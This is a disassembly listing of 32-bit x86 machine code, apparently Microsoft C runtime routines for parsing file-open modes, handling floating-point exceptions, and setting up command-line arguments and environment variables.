  4032e6:	57                   	push   %edi
  4032e7:	e8 7f 13 00 00       	call   0x40466b
  4032ec:	83 f8 ff             	cmp    $0xffffffff,%eax
  4032ef:	59                   	pop    %ecx
  4032f0:	74 3c                	je     0x40332e
  4032f2:	83 ff 01             	cmp    $0x1,%edi
  4032f5:	74 05                	je     0x4032fc
  4032f7:	83 ff 02             	cmp    $0x2,%edi
  4032fa:	75 16                	jne    0x403312
  4032fc:	6a 02                	push   $0x2
  4032fe:	e8 68 13 00 00       	call   0x40466b
  403303:	6a 01                	push   $0x1
  403305:	8b e8                	mov    %eax,%ebp
  403307:	e8 5f 13 00 00       	call   0x40466b
  40330c:	59                   	pop    %ecx
  40330d:	3b c5                	cmp    %ebp,%eax
  40330f:	59                   	pop    %ecx
  403310:	74 1c                	je     0x40332e
  403312:	57                   	push   %edi
  403313:	e8 53 13 00 00       	call   0x40466b
  403318:	59                   	pop    %ecx
  403319:	50                   	push   %eax
  40331a:	ff 15 78 80 40 00    	call   *0x408078
  403320:	85 c0                	test   %eax,%eax
  403322:	75 0a                	jne    0x40332e
  403324:	ff 15 60 80 40 00    	call   *0x408060
  40332a:	8b e8                	mov    %eax,%ebp
  40332c:	eb 02                	jmp    0x403330
  40332e:	33 ed                	xor    %ebp,%ebp
  403330:	57                   	push   %edi
  403331:	e8 bb 12 00 00       	call   0x4045f1
  403336:	8b 03                	mov    (%ebx),%eax
  403338:	59                   	pop    %ecx
  403339:	80 64 30 04 00       	andb   $0x0,0x4(%eax,%esi,1)
  40333e:	85 ed                	test   %ebp,%ebp
  403340:	74 09                	je     0x40334b
  403342:	55                   	push   %ebp
  403343:	e8 36 11 00 00       	call   0x40447e
  403348:	59                   	pop    %ecx
  403349:	eb 15                	jmp    0x403360
  40334b:	33 c0                	xor    %eax,%eax
  40334d:	eb 14                	jmp    0x403363
  40334f:	83 25 e8 bd 40 00 00 	andl   $0x0,0x40bde8
  403356:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  40335d:	00 00 00 
  403360:	83 c8 ff             	or     $0xffffffff,%eax
  403363:	5f                   	pop    %edi
  403364:	5e                   	pop    %esi
  403365:	5d                   	pop    %ebp
  403366:	5b                   	pop    %ebx
  403367:	c3                   	ret
  403368:	56                   	push   %esi
  403369:	8b 74 24 08          	mov    0x8(%esp),%esi
  40336d:	8b 46 0c             	mov    0xc(%esi),%eax
  403370:	a8 83                	test   $0x83,%al
  403372:	74 1d                	je     0x403391
  403374:	a8 08                	test   $0x8,%al
  403376:	74 19                	je     0x403391
  403378:	ff 76 08             	push   0x8(%esi)
  40337b:	e8 cc fe ff ff       	call   0x40324c
  403380:	66 81 66 0c f7 fb    	andw   $0xfbf7,0xc(%esi)
  403386:	33 c0                	xor    %eax,%eax
  403388:	59                   	pop    %ecx
  403389:	89 06                	mov    %eax,(%esi)
  40338b:	89 46 08             	mov    %eax,0x8(%esi)
  40338e:	89 46 04             	mov    %eax,0x4(%esi)
  403391:	5e                   	pop    %esi
  403392:	c3                   	ret
  403393:	55                   	push   %ebp
  403394:	8b ec                	mov    %esp,%ebp
  403396:	51                   	push   %ecx
  403397:	51                   	push   %ecx
  403398:	53                   	push   %ebx
  403399:	56                   	push   %esi
  40339a:	8b 35 44 bf 40 00    	mov    0x40bf44,%esi
  4033a0:	57                   	push   %edi
  4033a1:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4033a4:	33 db                	xor    %ebx,%ebx
  4033a6:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4033a9:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4033ac:	8a 07                	mov    (%edi),%al
  4033ae:	3c 61                	cmp    $0x61,%al
  4033b0:	74 1a                	je     0x4033cc
  4033b2:	3c 72                	cmp    $0x72,%al
  4033b4:	74 0f                	je     0x4033c5
  4033b6:	3c 77                	cmp    $0x77,%al
  4033b8:	0f 85 22 01 00 00    	jne    0x4034e0
  4033be:	b9 01 03 00 00       	mov    $0x301,%ecx
  4033c3:	eb 0c                	jmp    0x4033d1
  4033c5:	33 c9                	xor    %ecx,%ecx
  4033c7:	83 ce 01             	or     $0x1,%esi
  4033ca:	eb 08                	jmp    0x4033d4
  4033cc:	b9 09 01 00 00       	mov    $0x109,%ecx
  4033d1:	83 ce 02             	or     $0x2,%esi
  4033d4:	6a 01                	push   $0x1
  4033d6:	5a                   	pop    %edx
  4033d7:	8a 47 01             	mov    0x1(%edi),%al
  4033da:	47                   	inc    %edi
  4033db:	3a c3                	cmp    %bl,%al
  4033dd:	0f 84 e3 00 00 00    	je     0x4034c6
  4033e3:	3b d3                	cmp    %ebx,%edx
  4033e5:	0f 84 db 00 00 00    	je     0x4034c6
  4033eb:	0f be c0             	movsbl %al,%eax
  4033ee:	83 f8 54             	cmp    $0x54,%eax
  4033f1:	7f 72                	jg     0x403465
  4033f3:	74 60                	je     0x403455
  4033f5:	83 e8 2b             	sub    $0x2b,%eax
  4033f8:	74 45                	je     0x40343f
  4033fa:	83 e8 19             	sub    $0x19,%eax
  4033fd:	74 36                	je     0x403435
  4033ff:	83 e8 0e             	sub    $0xe,%eax
  403402:	74 1c                	je     0x403420
  403404:	48                   	dec    %eax
  403405:	0f 85 ac 00 00 00    	jne    0x4034b7
  40340b:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  40340e:	0f 85 a3 00 00 00    	jne    0x4034b7
  403414:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40341b:	83 c9 20             	or     $0x20,%ecx
  40341e:	eb b7                	jmp    0x4033d7
  403420:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  403423:	0f 85 8e 00 00 00    	jne    0x4034b7
  403429:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403430:	83 c9 10             	or     $0x10,%ecx
  403433:	eb a2                	jmp    0x4033d7
  403435:	f6 c1 40             	test   $0x40,%cl
  403438:	75 7d                	jne    0x4034b7
  40343a:	83 c9 40             	or     $0x40,%ecx
  40343d:	eb 98                	jmp    0x4033d7
  40343f:	f6 c1 02             	test   $0x2,%cl
  403442:	75 73                	jne    0x4034b7
  403444:	83 e1 fe             	and    $0xfffffffe,%ecx
  403447:	83 e6 fc             	and    $0xfffffffc,%esi
  40344a:	83 c9 02             	or     $0x2,%ecx
  40344d:	81 ce 80 00 00 00    	or     $0x80,%esi
  403453:	eb 82                	jmp    0x4033d7
  403455:	b8 00 10 00 00       	mov    $0x1000,%eax
  40345a:	85 c8                	test   %ecx,%eax
  40345c:	75 59                	jne    0x4034b7
  40345e:	0b c8                	or     %eax,%ecx
  403460:	e9 72 ff ff ff       	jmp    0x4033d7
  403465:	83 e8 62             	sub    $0x62,%eax
  403468:	74 48                	je     0x4034b2
  40346a:	48                   	dec    %eax
  40346b:	74 2e                	je     0x40349b
  40346d:	83 e8 0b             	sub    $0xb,%eax
  403470:	74 12                	je     0x403484
  403472:	83 e8 06             	sub    $0x6,%eax
  403475:	75 40                	jne    0x4034b7
  403477:	f6 c5 c0             	test   $0xc0,%ch
  40347a:	75 3b                	jne    0x4034b7
  40347c:	80 cd 40             	or     $0x40,%ch
  40347f:	e9 53 ff ff ff       	jmp    0x4033d7
  403484:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  403487:	75 2e                	jne    0x4034b7
  403489:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  403490:	81 e6 ff bf ff ff    	and    $0xffffbfff,%esi
  403496:	e9 3c ff ff ff       	jmp    0x4033d7
  40349b:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40349e:	75 17                	jne    0x4034b7
  4034a0:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4034a7:	81 ce 00 40 00 00    	or     $0x4000,%esi
  4034ad:	e9 25 ff ff ff       	jmp    0x4033d7
  4034b2:	f6 c5 c0             	test   $0xc0,%ch
  4034b5:	74 07                	je     0x4034be
  4034b7:	33 d2                	xor    %edx,%edx
  4034b9:	e9 19 ff ff ff       	jmp    0x4033d7
  4034be:	80 cd 80             	or     $0x80,%ch
  4034c1:	e9 11 ff ff ff       	jmp    0x4033d7
  4034c6:	68 a4 01 00 00       	push   $0x1a4
  4034cb:	ff 75 10             	push   0x10(%ebp)
  4034ce:	51                   	push   %ecx
  4034cf:	ff 75 08             	push   0x8(%ebp)
  4034d2:	e8 8e 22 00 00       	call   0x405765
  4034d7:	8b c8                	mov    %eax,%ecx
  4034d9:	83 c4 10             	add    $0x10,%esp
  4034dc:	3b cb                	cmp    %ebx,%ecx
  4034de:	7d 04                	jge    0x4034e4
  4034e0:	33 c0                	xor    %eax,%eax
  4034e2:	eb 1a                	jmp    0x4034fe
  4034e4:	8b 45 14             	mov    0x14(%ebp),%eax
  4034e7:	ff 05 e0 bd 40 00    	incl   0x40bde0
  4034ed:	89 70 0c             	mov    %esi,0xc(%eax)
  4034f0:	89 58 04             	mov    %ebx,0x4(%eax)
  4034f3:	89 18                	mov    %ebx,(%eax)
  4034f5:	89 58 08             	mov    %ebx,0x8(%eax)
  4034f8:	89 58 1c             	mov    %ebx,0x1c(%eax)
  4034fb:	89 48 10             	mov    %ecx,0x10(%eax)
  4034fe:	5f                   	pop    %edi
  4034ff:	5e                   	pop    %esi
  403500:	5b                   	pop    %ebx
  403501:	c9                   	leave
  403502:	c3                   	ret
  403503:	8b 15 00 d3 40 00    	mov    0x40d300,%edx
  403509:	53                   	push   %ebx
  40350a:	55                   	push   %ebp
  40350b:	56                   	push   %esi
  40350c:	33 ed                	xor    %ebp,%ebp
  40350e:	33 f6                	xor    %esi,%esi
  403510:	33 c0                	xor    %eax,%eax
  403512:	3b d5                	cmp    %ebp,%edx
  403514:	57                   	push   %edi
  403515:	7e 5d                	jle    0x403574
  403517:	8b 1d f8 c2 40 00    	mov    0x40c2f8,%ebx
  40351d:	8b fb                	mov    %ebx,%edi
  40351f:	8b 0f                	mov    (%edi),%ecx
  403521:	3b cd                	cmp    %ebp,%ecx
  403523:	74 15                	je     0x40353a
  403525:	f6 41 0c 83          	testb  $0x83,0xc(%ecx)
  403529:	74 0a                	je     0x403535
  40352b:	40                   	inc    %eax
  40352c:	83 c7 04             	add    $0x4,%edi
  40352f:	3b c2                	cmp    %edx,%eax
  403531:	7c ec                	jl     0x40351f
  403533:	eb 3f                	jmp    0x403574
  403535:	8b 34 83             	mov    (%ebx,%eax,4),%esi
  403538:	eb 24                	jmp    0x40355e
  40353a:	8b f8                	mov    %eax,%edi
  40353c:	6a 20                	push   $0x20
  40353e:	c1 e7 02             	shl    $0x2,%edi
  403541:	e8 7a 0b 00 00       	call   0x4040c0
  403546:	59                   	pop    %ecx
  403547:	8b 0d f8 c2 40 00    	mov    0x40c2f8,%ecx
  40354d:	89 04 0f             	mov    %eax,(%edi,%ecx,1)
  403550:	a1 f8 c2 40 00       	mov    0x40c2f8,%eax
  403555:	8b 3c 07             	mov    (%edi,%eax,1),%edi
  403558:	3b fd                	cmp    %ebp,%edi
  40355a:	74 18                	je     0x403574
  40355c:	8b f7                	mov    %edi,%esi
  40355e:	3b f5                	cmp    %ebp,%esi
  403560:	74 12                	je     0x403574
  403562:	83 4e 10 ff          	orl    $0xffffffff,0x10(%esi)
  403566:	89 6e 04             	mov    %ebp,0x4(%esi)
  403569:	89 6e 0c             	mov    %ebp,0xc(%esi)
  40356c:	89 6e 08             	mov    %ebp,0x8(%esi)
  40356f:	89 2e                	mov    %ebp,(%esi)
  403571:	89 6e 1c             	mov    %ebp,0x1c(%esi)
  403574:	8b c6                	mov    %esi,%eax
  403576:	5f                   	pop    %edi
  403577:	5e                   	pop    %esi
  403578:	5d                   	pop    %ebp
  403579:	5b                   	pop    %ebx
  40357a:	c3                   	ret
  40357b:	55                   	push   %ebp
  40357c:	8b ec                	mov    %esp,%ebp
  40357e:	53                   	push   %ebx
  40357f:	ff 75 08             	push   0x8(%ebp)
  403582:	e8 35 01 00 00       	call   0x4036bc
  403587:	85 c0                	test   %eax,%eax
  403589:	59                   	pop    %ecx
  40358a:	0f 84 20 01 00 00    	je     0x4036b0
  403590:	8b 58 08             	mov    0x8(%eax),%ebx
  403593:	85 db                	test   %ebx,%ebx
  403595:	0f 84 15 01 00 00    	je     0x4036b0
  40359b:	83 fb 05             	cmp    $0x5,%ebx
  40359e:	75 0c                	jne    0x4035ac
  4035a0:	83 60 08 00          	andl   $0x0,0x8(%eax)
  4035a4:	6a 01                	push   $0x1
  4035a6:	58                   	pop    %eax
  4035a7:	e9 0d 01 00 00       	jmp    0x4036b9
  4035ac:	83 fb 01             	cmp    $0x1,%ebx
  4035af:	0f 84 f6 00 00 00    	je     0x4036ab
  4035b5:	8b 0d 30 be 40 00    	mov    0x40be30,%ecx
  4035bb:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4035be:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4035c1:	89 0d 30 be 40 00    	mov    %ecx,0x40be30
  4035c7:	8b 48 04             	mov    0x4(%eax),%ecx
  4035ca:	83 f9 08             	cmp    $0x8,%ecx
  4035cd:	0f 85 c8 00 00 00    	jne    0x40369b
  4035d3:	8b 0d 80 95 40 00    	mov    0x409580,%ecx
  4035d9:	8b 15 84 95 40 00    	mov    0x409584,%edx
  4035df:	03 d1                	add    %ecx,%edx
  4035e1:	56                   	push   %esi
  4035e2:	3b ca                	cmp    %edx,%ecx
  4035e4:	7d 15                	jge    0x4035fb
  4035e6:	8d 34 49             	lea    (%ecx,%ecx,2),%esi
  4035e9:	2b d1                	sub    %ecx,%edx
  4035eb:	8d 34 b5 10 95 40 00 	lea    0x409510(,%esi,4),%esi
  4035f2:	83 26 00             	andl   $0x0,(%esi)
  4035f5:	83 c6 0c             	add    $0xc,%esi
  4035f8:	4a                   	dec    %edx
  4035f9:	75 f7                	jne    0x4035f2
  4035fb:	8b 00                	mov    (%eax),%eax
  4035fd:	8b 35 8c 95 40 00    	mov    0x40958c,%esi
  403603:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  403608:	75 0c                	jne    0x403616
  40360a:	c7 05 8c 95 40 00 83 	movl   $0x83,0x40958c
  403611:	00 00 00 
  403614:	eb 70                	jmp    0x403686
  403616:	3d 90 00 00 c0       	cmp    $0xc0000090,%eax
  40361b:	75 0c                	jne    0x403629
  40361d:	c7 05 8c 95 40 00 81 	movl   $0x81,0x40958c
  403624:	00 00 00 
  403627:	eb 5d                	jmp    0x403686
  403629:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  40362e:	75 0c                	jne    0x40363c
  403630:	c7 05 8c 95 40 00 84 	movl   $0x84,0x40958c
  403637:	00 00 00 
  40363a:	eb 4a                	jmp    0x403686
  40363c:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  403641:	75 0c                	jne    0x40364f
  403643:	c7 05 8c 95 40 00 85 	movl   $0x85,0x40958c
  40364a:	00 00 00 
  40364d:	eb 37                	jmp    0x403686
  40364f:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  403654:	75 0c                	jne    0x403662
  403656:	c7 05 8c 95 40 00 82 	movl   $0x82,0x40958c
  40365d:	00 00 00 
  403660:	eb 24                	jmp    0x403686
  403662:	3d 8f 00 00 c0       	cmp    $0xc000008f,%eax
  403667:	75 0c                	jne    0x403675
  403669:	c7 05 8c 95 40 00 86 	movl   $0x86,0x40958c
  403670:	00 00 00 
  403673:	eb 11                	jmp    0x403686
  403675:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  40367a:	75 0a                	jne    0x403686
  40367c:	c7 05 8c 95 40 00 8a 	movl   $0x8a,0x40958c
  403683:	00 00 00 
  403686:	ff 35 8c 95 40 00    	push   0x40958c
  40368c:	6a 08                	push   $0x8
  40368e:	ff d3                	call   *%ebx
  403690:	59                   	pop    %ecx
  403691:	89 35 8c 95 40 00    	mov    %esi,0x40958c
  403697:	59                   	pop    %ecx
  403698:	5e                   	pop    %esi
  403699:	eb 08                	jmp    0x4036a3
  40369b:	83 60 08 00          	andl   $0x0,0x8(%eax)
  40369f:	51                   	push   %ecx
  4036a0:	ff d3                	call   *%ebx
  4036a2:	59                   	pop    %ecx
  4036a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4036a6:	a3 30 be 40 00       	mov    %eax,0x40be30
  4036ab:	83 c8 ff             	or     $0xffffffff,%eax
  4036ae:	eb 09                	jmp    0x4036b9
  4036b0:	ff 75 0c             	push   0xc(%ebp)
  4036b3:	ff 15 7c 80 40 00    	call   *0x40807c
  4036b9:	5b                   	pop    %ebx
  4036ba:	5d                   	pop    %ebp
  4036bb:	c3                   	ret
  4036bc:	8b 54 24 04          	mov    0x4(%esp),%edx
  4036c0:	8b 0d 88 95 40 00    	mov    0x409588,%ecx
  4036c6:	39 15 08 95 40 00    	cmp    %edx,0x409508
  4036cc:	56                   	push   %esi
  4036cd:	b8 08 95 40 00       	mov    $0x409508,%eax
  4036d2:	74 15                	je     0x4036e9
  4036d4:	8d 34 49             	lea    (%ecx,%ecx,2),%esi
  4036d7:	8d 34 b5 08 95 40 00 	lea    0x409508(,%esi,4),%esi
  4036de:	83 c0 0c             	add    $0xc,%eax
  4036e1:	3b c6                	cmp    %esi,%eax
  4036e3:	73 04                	jae    0x4036e9
  4036e5:	39 10                	cmp    %edx,(%eax)
  4036e7:	75 f5                	jne    0x4036de
  4036e9:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  4036ec:	5e                   	pop    %esi
  4036ed:	8d 0c 8d 08 95 40 00 	lea    0x409508(,%ecx,4),%ecx
  4036f4:	3b c1                	cmp    %ecx,%eax
  4036f6:	73 04                	jae    0x4036fc
  4036f8:	39 10                	cmp    %edx,(%eax)
  4036fa:	74 02                	je     0x4036fe
  4036fc:	33 c0                	xor    %eax,%eax
  4036fe:	c3                   	ret
  4036ff:	83 3d e8 c2 40 00 00 	cmpl   $0x0,0x40c2e8
  403706:	75 05                	jne    0x40370d
  403708:	e8 17 27 00 00       	call   0x405e24
  40370d:	56                   	push   %esi
  40370e:	8b 35 04 d3 40 00    	mov    0x40d304,%esi
  403714:	8a 06                	mov    (%esi),%al
  403716:	3c 22                	cmp    $0x22,%al
  403718:	75 25                	jne    0x40373f
  40371a:	8a 46 01             	mov    0x1(%esi),%al
  40371d:	46                   	inc    %esi
  40371e:	3c 22                	cmp    $0x22,%al
  403720:	74 15                	je     0x403737
  403722:	84 c0                	test   %al,%al
  403724:	74 11                	je     0x403737
  403726:	0f b6 c0             	movzbl %al,%eax
  403729:	50                   	push   %eax
  40372a:	e8 ef 22 00 00       	call   0x405a1e
  40372f:	85 c0                	test   %eax,%eax
  403731:	59                   	pop    %ecx
  403732:	74 e6                	je     0x40371a
  403734:	46                   	inc    %esi
  403735:	eb e3                	jmp    0x40371a
  403737:	80 3e 22             	cmpb   $0x22,(%esi)
  40373a:	75 0d                	jne    0x403749
  40373c:	46                   	inc    %esi
  40373d:	eb 0a                	jmp    0x403749
  40373f:	3c 20                	cmp    $0x20,%al
  403741:	76 06                	jbe    0x403749
  403743:	46                   	inc    %esi
  403744:	80 3e 20             	cmpb   $0x20,(%esi)
  403747:	77 fa                	ja     0x403743
  403749:	8a 06                	mov    (%esi),%al
  40374b:	84 c0                	test   %al,%al
  40374d:	74 04                	je     0x403753
  40374f:	3c 20                	cmp    $0x20,%al
  403751:	76 e9                	jbe    0x40373c
  403753:	8b c6                	mov    %esi,%eax
  403755:	5e                   	pop    %esi
  403756:	c3                   	ret
  403757:	53                   	push   %ebx
  403758:	33 db                	xor    %ebx,%ebx
  40375a:	39 1d e8 c2 40 00    	cmp    %ebx,0x40c2e8
  403760:	56                   	push   %esi
  403761:	57                   	push   %edi
  403762:	75 05                	jne    0x403769
  403764:	e8 bb 26 00 00       	call   0x405e24
  403769:	8b 35 cc bd 40 00    	mov    0x40bdcc,%esi
  40376f:	33 ff                	xor    %edi,%edi
  403771:	8a 06                	mov    (%esi),%al
  403773:	3a c3                	cmp    %bl,%al
  403775:	74 12                	je     0x403789
  403777:	3c 3d                	cmp    $0x3d,%al
  403779:	74 01                	je     0x40377c
  40377b:	47                   	inc    %edi
  40377c:	56                   	push   %esi
  40377d:	e8 1e 0a 00 00       	call   0x4041a0
  403782:	59                   	pop    %ecx
  403783:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403787:	eb e8                	jmp    0x403771
  403789:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  403790:	50                   	push   %eax
  403791:	e8 2a 09 00 00       	call   0x4040c0
  403796:	8b f0                	mov    %eax,%esi
  403798:	59                   	pop    %ecx
  403799:	3b f3                	cmp    %ebx,%esi
  40379b:	89 35 0c be 40 00    	mov    %esi,0x40be0c
  4037a1:	75 08                	jne    0x4037ab
  4037a3:	6a 09                	push   $0x9
  4037a5:	e8 06 eb ff ff       	call   0x4022b0
  4037aa:	59                   	pop    %ecx
  4037ab:	8b 3d cc bd 40 00    	mov    0x40bdcc,%edi
  4037b1:	38 1f                	cmp    %bl,(%edi)
  4037b3:	74 39                	je     0x4037ee
  4037b5:	55                   	push   %ebp
  4037b6:	57                   	push   %edi
  4037b7:	e8 e4 09 00 00       	call   0x4041a0
  4037bc:	8b e8                	mov    %eax,%ebp
  4037be:	59                   	pop    %ecx
  4037bf:	45                   	inc    %ebp
  4037c0:	80 3f 3d             	cmpb   $0x3d,(%edi)
  4037c3:	74 22                	je     0x4037e7
  4037c5:	55                   	push   %ebp
  4037c6:	e8 f5 08 00 00       	call   0x4040c0
  4037cb:	3b c3                	cmp    %ebx,%eax
  4037cd:	59                   	pop    %ecx
  4037ce:	89 06                	mov    %eax,(%esi)
  4037d0:	75 08                	jne    0x4037da
  4037d2:	6a 09                	push   $0x9
  4037d4:	e8 d7 ea ff ff       	call   0x4022b0
  4037d9:	59                   	pop    %ecx
  4037da:	57                   	push   %edi
  4037db:	ff 36                	push   (%esi)
  4037dd:	e8 5e 26 00 00       	call   0x405e40
  4037e2:	59                   	pop    %ecx
  4037e3:	83 c6 04             	add    $0x4,%esi
  4037e6:	59                   	pop    %ecx
  4037e7:	03 fd                	add    %ebp,%edi
  4037e9:	38 1f                	cmp    %bl,(%edi)
  4037eb:	75 c9                	jne    0x4037b6
  4037ed:	5d                   	pop    %ebp
  4037ee:	ff 35 cc bd 40 00    	push   0x40bdcc
  4037f4:	e8 53 fa ff ff       	call   0x40324c
  4037f9:	59                   	pop    %ecx
  4037fa:	89 1d cc bd 40 00    	mov    %ebx,0x40bdcc
  403800:	89 1e                	mov    %ebx,(%esi)
  403802:	5f                   	pop    %edi
  403803:	5e                   	pop    %esi
  403804:	c7 05 e4 c2 40 00 01 	movl   $0x1,0x40c2e4
  40380b:	00 00 00 
  40380e:	5b                   	pop    %ebx
  40380f:	c3                   	ret
  403810:	55                   	push   %ebp
  403811:	8b ec                	mov    %esp,%ebp
  403813:	51                   	push   %ecx
  403814:	51                   	push   %ecx
  403815:	53                   	push   %ebx
  403816:	33 db                	xor    %ebx,%ebx
  403818:	39 1d e8 c2 40 00    	cmp    %ebx,0x40c2e8
  40381e:	56                   	push   %esi
  40381f:	57                   	push   %edi
  403820:	75 05                	jne    0x403827
  403822:	e8 fd 25 00 00       	call   0x405e24
  403827:	be 34 be 40 00       	mov    $0x40be34,%esi
  40382c:	68 04 01 00 00       	push   $0x104
  403831:	56                   	push   %esi
  403832:	53                   	push   %ebx
  403833:	ff 15 04 80 40 00    	call   *0x408004
  403839:	a1 04 d3 40 00       	mov    0x40d304,%eax
  40383e:	89 35 1c be 40 00    	mov    %esi,0x40be1c
  403844:	8b fe                	mov    %esi,%edi
  403846:	38 18                	cmp    %bl,(%eax)
  403848:	74 02                	je     0x40384c
  40384a:	8b f8                	mov    %eax,%edi
  40384c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40384f:	50                   	push   %eax
  403850:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403853:	50                   	push   %eax
  403854:	53                   	push   %ebx
  403855:	53                   	push   %ebx
  403856:	57                   	push   %edi
  403857:	e8 4d 00 00 00       	call   0x4038a9
  40385c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40385f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403862:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403865:	50                   	push   %eax
  403866:	e8 55 08 00 00       	call   0x4040c0
  40386b:	8b f0                	mov    %eax,%esi
  40386d:	83 c4 18             	add    $0x18,%esp
  403870:	3b f3                	cmp    %ebx,%esi
  403872:	75 08                	jne    0x40387c
  403874:	6a 08                	push   $0x8
  403876:	e8 35 ea ff ff       	call   0x4022b0
  40387b:	59                   	pop    %ecx
  40387c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40387f:	50                   	push   %eax
  403880:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403883:	50                   	push   %eax
  403884:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403887:	8d 04 86             	lea    (%esi,%eax,4),%eax
  40388a:	50                   	push   %eax
  40388b:	56                   	push   %esi
  40388c:	57                   	push   %edi
  40388d:	e8 17 00 00 00       	call   0x4038a9
  403892:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403895:	83 c4 14             	add    $0x14,%esp
  403898:	48                   	dec    %eax
  403899:	89 35 04 be 40 00    	mov    %esi,0x40be04
  40389f:	5f                   	pop    %edi
  4038a0:	5e                   	pop    %esi
  4038a1:	a3 00 be 40 00       	mov    %eax,0x40be00
  4038a6:	5b                   	pop    %ebx
  4038a7:	c9                   	leave
  4038a8:	c3                   	ret
  4038a9:	55                   	push   %ebp
  4038aa:	8b ec                	mov    %esp,%ebp
  4038ac:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4038af:	8b 45 14             	mov    0x14(%ebp),%eax
  4038b2:	53                   	push   %ebx
  4038b3:	56                   	push   %esi
  4038b4:	83 21 00             	andl   $0x0,(%ecx)
  4038b7:	8b 75 10             	mov    0x10(%ebp),%esi
  4038ba:	57                   	push   %edi
  4038bb:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4038be:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4038c4:	8b 45 08             	mov    0x8(%ebp),%eax
  4038c7:	85 ff                	test   %edi,%edi
  4038c9:	74 08                	je     0x4038d3
  4038cb:	89 37                	mov    %esi,(%edi)
  4038cd:	83 c7 04             	add    $0x4,%edi
  4038d0:	89 7d 0c             	mov    %edi,0xc(%ebp)
  4038d3:	80 38 22             	cmpb   $0x22,(%eax)
  4038d6:	75 44                	jne    0x40391c
  4038d8:	8a 50 01             	mov    0x1(%eax),%dl
  4038db:	40                   	inc    %eax
  4038dc:	80 fa 22             	cmp    $0x22,%dl
  4038df:	74 29                	je     0x40390a
  4038e1:	84 d2                	test   %dl,%dl
  4038e3:	74 25                	je     0x40390a
  4038e5:	0f b6 d2             	movzbl %dl,%edx
  4038e8:	f6 82 a1 c0 40 00 04 	testb  $0x4,0x40c0a1(%edx)
  4038ef:	74 0c                	je     0x4038fd
  4038f1:	ff 01                	incl   (%ecx)
  4038f3:	85 f6                	test   %esi,%esi
  4038f5:	74 06                	je     0x4038fd
  4038f7:	8a 10                	mov    (%eax),%dl
  4038f9:	88 16                	mov    %dl,(%esi)
  4038fb:	46                   	inc    %esi
  4038fc:	40                   	inc    %eax
  4038fd:	ff 01                	incl   (%ecx)
  4038ff:	85 f6                	test   %esi,%esi
  403901:	74 d5                	je     0x4038d8
  403903:	8a 10                	mov    (%eax),%dl
  403905:	88 16                	mov    %dl,(%esi)
  403907:	46                   	inc    %esi
  403908:	eb ce                	jmp    0x4038d8
  40390a:	ff 01                	incl   (%ecx)
  40390c:	85 f6                	test   %esi,%esi
  40390e:	74 04                	je     0x403914
  403910:	80 26 00             	andb   $0x0,(%esi)
  403913:	46                   	inc    %esi
  403914:	80 38 22             	cmpb   $0x22,(%eax)
  403917:	75 46                	jne    0x40395f
  403919:	40                   	inc    %eax
  40391a:	eb 43                	jmp    0x40395f
  40391c:	ff 01                	incl   (%ecx)
  40391e:	85 f6                	test   %esi,%esi
  403920:	74 05                	je     0x403927
  403922:	8a 10                	mov    (%eax),%dl
  403924:	88 16                	mov    %dl,(%esi)
  403926:	46                   	inc    %esi
  403927:	8a 10                	mov    (%eax),%dl
  403929:	40                   	inc    %eax
  40392a:	0f b6 da             	movzbl %dl,%ebx
  40392d:	f6 83 a1 c0 40 00 04 	testb  $0x4,0x40c0a1(%ebx)
  403934:	74 0c                	je     0x403942
  403936:	ff 01                	incl   (%ecx)
  403938:	85 f6                	test   %esi,%esi
  40393a:	74 05                	je     0x403941
  40393c:	8a 18                	mov    (%eax),%bl
  40393e:	88 1e                	mov    %bl,(%esi)
  403940:	46                   	inc    %esi
  403941:	40                   	inc    %eax
  403942:	80 fa 20             	cmp    $0x20,%dl
  403945:	74 09                	je     0x403950
  403947:	84 d2                	test   %dl,%dl
  403949:	74 09                	je     0x403954
  40394b:	80 fa 09             	cmp    $0x9,%dl
  40394e:	75 cc                	jne    0x40391c
  403950:	84 d2                	test   %dl,%dl
  403952:	75 03                	jne    0x403957
  403954:	48                   	dec    %eax
  403955:	eb 08                	jmp    0x40395f
  403957:	85 f6                	test   %esi,%esi
  403959:	74 04                	je     0x40395f
  40395b:	80 66 ff 00          	andb   $0x0,-0x1(%esi)
  40395f:	83 65 18 00          	andl   $0x0,0x18(%ebp)
  403963:	80 38 00             	cmpb   $0x0,(%eax)
  403966:	0f 84 e0 00 00 00    	je     0x403a4c
  40396c:	8a 10                	mov    (%eax),%dl
  40396e:	80 fa 20             	cmp    $0x20,%dl
  403971:	74 05                	je     0x403978
  403973:	80 fa 09             	cmp    $0x9,%dl
  403976:	75 03                	jne    0x40397b
  403978:	40                   	inc    %eax
